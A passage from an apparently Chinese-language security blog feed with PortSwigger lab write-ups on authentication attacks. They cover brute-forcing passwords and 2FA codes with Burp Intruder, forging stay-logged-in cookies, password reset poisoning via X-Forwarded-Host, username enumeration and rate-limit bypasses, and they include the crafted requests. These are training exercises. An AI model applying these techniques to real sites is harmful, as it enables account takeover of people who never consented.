&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;monitor&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;monitoring&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;montana&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;moon&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;moscow&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account?id=carlos&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将请求发送回浏览器即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Password brute-force via password change</title><link>/portswigger-posts/authentication-lab-password-brute-force-via-password-change/</link><pubDate>Sat, 07 Dec 2024 15:04:32 +0800</pubDate><guid>/portswigger-posts/authentication-lab-password-brute-force-via-password-change/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>登录成功后，看到此&lt;code>Change password&lt;/code>按钮
&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-2.jpg">&lt;/li>
&lt;li>根据不同参数条件，获得以下三种不同情况的Response
&lt;ol>
&lt;li>&lt;code>Current password&lt;/code>错误，但&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>相同&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/login&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>&lt;code>Current password&lt;/code>错误，且&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同，返回内容包含&lt;code>Current password is incorrect&lt;/code>关键字
&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-3.jpg">&lt;/li>
&lt;li>&lt;code>Current password&lt;/code>正确，但&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同，返回内容包含&lt;code>New passwords do not match&lt;/code>关键字
&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-4.jpg">&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>结合上述2、3的情况(&lt;code>Current password&lt;/code>错误/正确、&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同)，进行密码爆破，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos&amp;amp;current-password=§password§&amp;amp;new-password-1=1&amp;amp;new-password-2=12
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在结果中搜索&lt;code>New passwords do not match&lt;/code>关键字，获得密码为&lt;code>abc123&lt;/code>
&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-5.jpg">&lt;/li>
&lt;li>使用&lt;code>carlos:abc123&lt;/code>登录即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Password reset poisoning via middleware</title><link>/portswigger-posts/authentication-lab-password-reset-poisoning-via-middleware/</link><pubDate>Wed, 04 Dec 2024 22:56:33 +0800</pubDate><guid>/portswigger-posts/authentication-lab-password-reset-poisoning-via-middleware/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-11.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-11.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>首先使用&lt;code>wiener&lt;/code>点击&lt;code>Forgot password?&lt;/code>，在填写&lt;code>username&lt;/code>后点击按钮，对应Request如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a5800510400298b80f5992500c700e3.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=wiener
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录后通过上方&lt;code>Go to exploit server -&amp;gt; Email client&lt;/code>进行Email，查看邮件
&lt;img alt="Email" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-12.jpg">&lt;/li>
&lt;li>点击链接后跳转至重置密码页面，对应请求如下
&lt;img alt="Reset password" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-13.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password?temp-forgot-password-token=paic89ucgyrg7c90iwdlm68mq1x6rz6z &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a5800510400298b80f5992500c700e3.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>temp-forgot-password-token=paic89ucgyrg7c90iwdlm68mq1x6rz6z&amp;amp;new-password-1=1234&amp;amp;new-password-2=1234
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将步骤2的Request发送到Burp Repeater，在请求中新增&lt;code>X-Forwarded-Host&lt;/code>，指向&lt;code>Go to exploit server&lt;/code>的&lt;code>URL&lt;/code>，同时将&lt;code>username&lt;/code>设置为&lt;code>carlos&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a5800510400298b80f5992500c700e3.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0a520006049829088059982501f70055.exploit-server.net/exploit&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过&lt;code>Go to exploit server -&amp;gt; Access log&lt;/code>查看&lt;code>X-Forwarded-Host&lt;/code>所转发信息
&lt;img alt="Access log" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-14.jpg">&lt;/li>
&lt;li>访问&lt;code>https://0a5800510400298b80f5992500c700e3.web-security-academy.net/forgot-password?temp-forgot-password-token=550690ezc8yqhlyn0k881ch8xhz596mh&lt;/code>
&lt;img alt="Reset password" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-15.jpg">&lt;/li>
&lt;li>使用重置后的密码登录&lt;code>carlos&lt;/code>
&lt;img alt="Login" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-16.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Brute-forcing a stay-logged-in cookie</title><link>/portswigger-posts/authentication-lab-brute-forcing-a-stay-logged-in-cookie/</link><pubDate>Wed, 04 Dec 2024 21:36:25 +0800</pubDate><guid>/portswigger-posts/authentication-lab-brute-forcing-a-stay-logged-in-cookie/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-11.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-11.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>登录时点击&lt;code>Stay logged in&lt;/code>
&lt;img alt="Stay logged in" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-12.jpg">&lt;/li>
&lt;li>登录成功后获得此Request
&lt;pre tabindex="0">&lt;code>GET /my-account?id=wiener HTTP/2
Host: 0af300330343a8dd8221bf1b000600e4.web-security-academy.net
Cookie: session=ZCYAim6Xl60YARCUtIuqXCMDDHyoxPRs; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;code>stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&lt;/code>当中&lt;code>d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&lt;/code>对应&lt;code>Base64&lt;/code>解码为&lt;code>wiener:51dc30ddc473d43a6011e9ebba6ca770&lt;/code>，而&lt;code>51dc30ddc473d43a6011e9ebba6ca770&lt;/code>为密码&lt;code>peter&lt;/code>的md5编码&lt;/li>
&lt;li>根据上述，通过Burp Intruder的Sniper attack构造&lt;code>stay-logged-in&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表
&lt;img alt="Stay logged in" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-13.jpg">&lt;/li>
&lt;li>在扫描结果中搜索&lt;code>carlos&lt;/code>，即可得到结果，返回页面后即可解题
&lt;img alt="Login" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-14.jpg">
&lt;img alt="Login" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-15.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA broken logic</title><link>/portswigger-posts/authentication-lab-2fa-broken-logic/</link><pubDate>Mon, 02 Dec 2024 21:47:59 +0800</pubDate><guid>/portswigger-posts/authentication-lab-2fa-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-broken-logic-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>登录成功(url:&lt;code>/login&lt;/code>)后的Response如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/login2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">verify=wiener; HttpOnly&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; Secure; HttpOnly; SameSite=None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>登录成功后会跳转至&lt;code>/login2&lt;/code>，并且对应的Request为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a80005c0389890681083af800d600a9.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=wiener&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改Request的&lt;code>verify&lt;/code>参数为&lt;code>carlos&lt;/code>，并发送Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a80005c0389890681083af800d600a9.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=carlos&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>对应的Response为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3012&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面输入&lt;code>security code&lt;/code>后失败，将对应的Request发送至Intruder，修改&lt;code>verify&lt;/code>为&lt;code>carlos&lt;/code>，参数配置如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a80005c0389890681083af800d600a9.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=carlos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mfa-code=§1111§
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>&lt;img alt="Burp Intruder" src="/img/2024/authentication-lab-2fa-broken-logic-2.jpg">
6. 根据爆破的&lt;code>Length&lt;/code>排列，&lt;code>security code&lt;/code>为&lt;code>0448&lt;/code>，将此结果通过&lt;code>Request in browser -&amp;gt; In original session&lt;/code>返回页面
&lt;img alt="Burp Intruder result" src="/img/2024/authentication-lab-2fa-broken-logic-3.jpg">
7. 成功登录&lt;code>carlos&lt;/code>
s&lt;img alt="Success" src="/img/2024/authentication-lab-2fa-broken-logic-4.jpg">&lt;/p></content></item><item><title>[Write Up]Lab: Username enumeration via account lock</title><link>/portswigger-posts/authentication-lab-username-enumeration-via-account-lock/</link><pubDate>Sun, 01 Dec 2024 18:44:29 +0800</pubDate><guid>/portswigger-posts/authentication-lab-username-enumeration-via-account-lock/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>此题目提到&lt;code>account lock&lt;/code>意思是当&lt;code>用户存在时，多次尝试登录将会被禁止&lt;/code>，通过此特性，使用Burp Intruder的&lt;code>Cluster bomb attack&lt;/code>模式，2个参数分别为&lt;code>username&lt;/code>、以及&lt;code>password&lt;/code>的尾缀，参数1使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表，参数2使用&lt;code>Null payloads&lt;/code>且&lt;code>Generate 5&lt;/code>，其实参数2位置在哪里不重要，只要使参数1的&lt;code>username&lt;/code>作为payload发送5次即可
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">username=§username§&amp;amp;password=password§
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>扫描结果发现&lt;code>username&lt;/code>为&lt;code>academico&lt;/code>时会出现长度为&lt;code>3292&lt;/code>的返回，其内容包含&lt;code>You have made too many incorrect login attempts. Please try again in 1 minute(s).&lt;/code>，因此可以确认&lt;code>academico&lt;/code>是存在的用户
&lt;img alt="Account lock" src="/img/2024/authentication-lab-username-enumeration-via-account-lock-2.jpg">&lt;/li>
&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，通过python实现以下爆破方式
&lt;ol>
&lt;li>使用&lt;code>username=academico&amp;amp;password=&amp;lt;password&amp;gt;&lt;/code>进行登录尝试，&lt;code>&amp;lt;password&amp;gt;&lt;/code>使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表进行替换，并判断返回内容包含&lt;code>Your username is&lt;/code>则表示登录成功&lt;/li>
&lt;li>重复步骤1三次后，&lt;code>time.sleep(60)&lt;/code>，避免被禁止&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>爆破成功后获得密码，使用&lt;code>academico:aaaaaa&lt;/code>登录后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, IP block</title><link>/portswigger-posts/authentication-lab-broken-bruteforce-protection-ip-block/</link><pubDate>Sun, 01 Dec 2024 16:51:17 +0800</pubDate><guid>/portswigger-posts/authentication-lab-broken-bruteforce-protection-ip-block/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>在尝试几次手动登录错误后，会出现以下信息，且新增&lt;code>X-X-Forwarded-For&lt;/code>请求头后仍然会被禁止高频尝试
&lt;img alt="Brute-force protection" src="/img/2024/authentication-lab-broken-bruteforce-protection-ip-block-2.jpg">&lt;/li>
&lt;li>可以通过成功登录绕过此策略，所以通过python实现以下爆破方式
&lt;ol>
&lt;li>使用&lt;code>username=carlos&amp;amp;password=&amp;lt;password&amp;gt;&lt;/code>进行登录尝试，&lt;code>&amp;lt;password&amp;gt;&lt;/code>使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表进行替换，并判断返回内容包含&lt;code>Your username is&lt;/code>则表示登录成功&lt;/li>
&lt;li>重复步骤1两次后，使用&lt;code>username=wiener&amp;amp;password=peter&lt;/code>进行成功登录，避免被禁止&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>爆破成功后获得密码，使用&lt;code>carlos:austin&lt;/code>登录后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Authentication Lab Username Enumeration via Response Timing</title><link>/portswigger-posts/authentication-lab-username-enumeration-via-response-timing/</link><pubDate>Sun, 01 Dec 2024 15:04:12 +0800</pubDate><guid>/portswigger-posts/authentication-lab-username-enumeration-via-response-timing/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>根据题目提示需要通过请求返回时间判断用户是否存在，构建枚举用户名请求体时需要在&lt;code>password&lt;/code>参数输入足够长的值；另外题目也提到本地部署了简单的&lt;code>IP-based brute-force protection&lt;/code>，所以需要在请求头新增&lt;code>X-Forwarded-For&lt;/code>用于绕过防御，Burp Intruder使用&lt;code>Battering ram attack&lt;/code>模式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表+&lt;code>wiener&lt;/code>，请求内容如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ip.§ip§&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=§username§&amp;amp;password=wrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpassword
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将结果根据&lt;code>Response completed&lt;/code>排序，明显的&lt;code>wiener&lt;/code>、&lt;code>ap&lt;/code>两个用户相关的请求时间高与其他用户的请求，所以可以推断&lt;code>ap&lt;/code>也是存在的用户
&lt;img alt="Intruder result" src="/img/2024/authentication-lab-username-enumeration-via-response-timing-2.jpg">&lt;/li>
&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续使用&lt;code>Battering ram attack&lt;/code>模式扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表，请求内容如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ip.§ip§&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=ap&amp;amp;password=§pwd§
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
